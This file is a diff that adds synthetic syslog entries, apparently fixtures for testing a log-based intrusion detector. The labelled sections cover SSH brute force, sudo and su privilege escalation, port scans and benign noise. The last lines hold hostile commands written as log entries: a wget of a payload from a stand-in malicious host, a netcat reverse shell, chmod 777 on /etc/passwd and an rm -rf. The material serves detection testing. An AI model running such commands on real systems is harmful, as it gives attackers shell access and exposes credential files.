@@ -1,0 +1,79 @@
+# ==== brute-force: multiple IPs & counts ====
+Oct 14 08:00:01 server sshd[1001]: Failed password for invalid user root from 10.0.0.1 port 22
+Oct 14 08:00:02 server sshd[1001]: Failed password for invalid user root from 10.0.0.1 port 22
+Oct 14 08:00:03 server sshd[1001]: Failed password for invalid user root from 10.0.0.1 port 22
+Oct 14 08:00:04 server sshd[1001]: Failed password for invalid user root from 10.0.0.1 port 22
+Oct 14 08:00:05 server sshd[1001]: Failed password for invalid user root from 10.0.0.1 port 22
+Oct 14 08:00:06 server sshd[1001]: Failed password for invalid user root from 10.0.0.1 port 22
+
+Oct 14 08:05:01 server sshd[1020]: Failed password for invalid user admin from 10.0.0.2 port 22
+Oct 14 08:05:02 server sshd[1020]: Failed password for invalid user admin from 10.0.0.2 port 22
+Oct 14 08:05:03 server sshd[1020]: Failed password for invalid user admin from 10.0.0.2 port 22
+Oct 14 08:05:04 server sshd[1020]: Failed password for invalid user admin from 10.0.0.2 port 22
+Oct 14 08:05:05 server sshd[1020]: Failed password for invalid user admin from 10.0.0.2 port 22
+
+# benign login and other noise
+Oct 14 08:10:00 server sshd[1100]: Accepted password for alice from 192.168.0.10 port 33445
+Oct 14 08:12:14 server CRON[1200]: (root) CMD (run-parts /etc/cron.daily)
+
+# ==== privilege escalation examples ====
+Oct 14 09:00:00 server sudo:    bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 14 09:00:02 server sshd[2001]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Oct 14 09:01:00 server su: pam_unix(su:session): session opened for user root by charlie(uid=1002)
+Oct 14 09:02:00 server sudo:    alice : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/bin/vi /etc/hosts
+
+# mixed noise
+Oct 14 09:05:00 server systemd[1]: Started Daily apt download activities.
+Oct 14 09:05:23 server kernel: [    0.000000] Initializing cgroup subsys cpuset
+
+# ==== port-scan: one IP contacting many unique ports ====
+Oct 14 10:00:01 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=21
+Oct 14 10:00:02 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=22
+Oct 14 10:00:03 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=23
+Oct 14 10:00:04 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=25
+Oct 14 10:00:05 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=53
+Oct 14 10:00:06 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=80
+Oct 14 10:00:07 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=110
+Oct 14 10:00:08 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=143
+Oct 14 10:00:09 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=443
+Oct 14 10:00:10 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=3306
+Oct 14 10:00:11 server kernel: IN=eth0 OUT= MAC=... SRC=192.168.1.250 DST=10.0.0.2 LEN=60 PROTO=TCP SPT=12345 DPT=8080
+
+# ==== more brute force distributed over different IPs ====
+Oct 14 11:00:01 server sshd[3001]: Failed password for invalid user test from 172.16.0.5 port 2222
+Oct 14 11:00:02 server sshd[3001]: Failed password for invalid user test from 172.16.0.5 port 2222
+Oct 14 11:00:03 server sshd[3001]: Failed password for invalid user test from 172.16.0.5 port 2222
+Oct 14 11:00:04 server sshd[3001]: Failed password for invalid user test from 172.16.0.5 port 2222
+Oct 14 11:00:05 server sshd[3001]: Failed password for invalid user test from 172.16.0.5 port 2222
+Oct 14 11:00:06 server sshd[3001]: Failed password for invalid user test from 172.16.0.5 port 2222
+
+# random harmless messages
+Oct 14 11:10:00 server systemd[1]: Starting Cleanup of Temporary Directories...
+Oct 14 11:15:00 server kernel: Device plugged
+Oct 14 11:20:00 server sshd[4000]: Connection closed by 203.0.113.10 port 54321 [preauth]
+Oct 14 01:05:01 host1 sshd[1234]: Failed password for invalid user admin from 192.168.1.101 port 54321 ssh2
+Oct 14 01:05:05 host1 sshd[1234]: Failed password for invalid user admin from 192.168.1.101 port 54322 ssh2
+Oct 14 01:05:10 host1 sshd[1234]: Failed password for invalid user admin from 192.168.1.101 port 54323 ssh2
+Oct 14 01:10:01 host1 sshd[1234]: Accepted password for root from 10.0.0.5 port 54400 ssh2
+Oct 14 02:15:01 host1 sshd[1234]: Accepted password for root from 203.0.113.42 port 54401 ssh2
+Oct 14 02:20:01 host1 sshd[1234]: Accepted password for user1 from 10.0.0.20 port 54402 ssh2
+
+Oct 14 03:05:01 host1 sudo: user1 : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/myscript.sh
+Oct 14 03:10:01 host1 su: pam_unix(su:session): session opened for user root by user1
+Oct 14 03:15:01 host1 useradd[2001]: new user testuser added to system
+Oct 14 03:20:01 host1 bash[2345]: /tmp/evil.sh executed
+Oct 14 03:25:01 host1 chmod[2346]: chmod 777 /etc/passwd
+
+Oct 14 04:05:01 host1 apache2[3001]: error: file not found /var/www/html/index.php
+Oct 14 04:10:01 host1 apache2[3001]: error: file not found /var/www/html/login.php
+Oct 14 04:15:01 host1 apache2[3001]: error: file not found /var/www/html/config.php
+
+Oct 14 05:05:01 host1 sshd[1234]: Connection from 198.51.100.23 to port 2222
+Oct 14 05:05:02 host1 sshd[1234]: Connection from 198.51.100.23 to port 2223
+Oct 14 05:05:03 host1 sshd[1234]: Connection from 198.51.100.23 to port 2224
+
+Oct 14 06:05:01 host1 curl[4001]: wget http://malicious.example.com/bad.bin
+Oct 14 06:10:01 host1 bash[4002]: nc -e /bin/sh 203.0.113.42 4444
+Oct 14 06:15:01 host1 bash[4003]: rm -rf /tmp/*
+Oct 14 06:20:01 host1 sshd[4004]: outbound connection ESTABLISHED 198.51.100.99:443 by sshd
+
